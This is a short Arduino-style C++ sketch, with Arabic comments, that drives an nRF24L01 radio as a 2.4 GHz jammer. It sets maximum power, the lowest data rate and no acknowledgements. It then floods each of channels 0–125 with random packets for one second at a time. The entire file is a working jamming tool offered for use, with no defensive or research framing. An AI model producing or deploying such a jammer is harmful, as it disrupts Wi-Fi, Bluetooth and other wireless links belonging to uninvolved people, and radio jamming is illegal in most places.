#include <SPI.h>
#include <nRF24L01.h>
#include <RF24.h>

#define CE_PIN  4
#define CSN_PIN 5

RF24 radio(CE_PIN, CSN_PIN);

void setup() {
    Serial.begin(115200);
    radio.begin();
    radio.setPALevel(RF24_PA_MAX);  // أقصى طاقة للإرسال
    radio.setDataRate(RF24_250KBPS); // تقليل معدل البيانات لجعل التشويش أكثر فاعلية
    radio.setAutoAck(false); // تعطيل تأكيد الاستلام
}

void loop() {
    byte jammingData[32]; // بيانات عشوائية بحجم 32 بايت

    // إنشاء بيانات عشوائية داخل الحزمة
    for (int i = 0; i < 32; i++) {
        jammingData[i] = random(0, 256);
    }

    // التشويش على كل قناة لمدة ثانية واحدة
    for (int channel = 0; channel <= 125; channel++) {
        radio.setChannel(channel); // تغيير القناة
        Serial.print("Jamming on channel: ");
        Serial.println(channel);

        unsigned long startTime = millis(); // تسجيل وقت بدء التشويش على القناة الحالية

        while (millis() - startTime < 1000) { // تشويش لمدة 1000ms (1 ثانية)
            radio.stopListening(); // التبديل لوضع الإرسال
            radio.write(jammingData, sizeof(jammingData)); // إرسال الحزمة
            delayMicroseconds(500); // تقليل الضغط على المودول وضمان استقرار التشويش
        }
    }
}
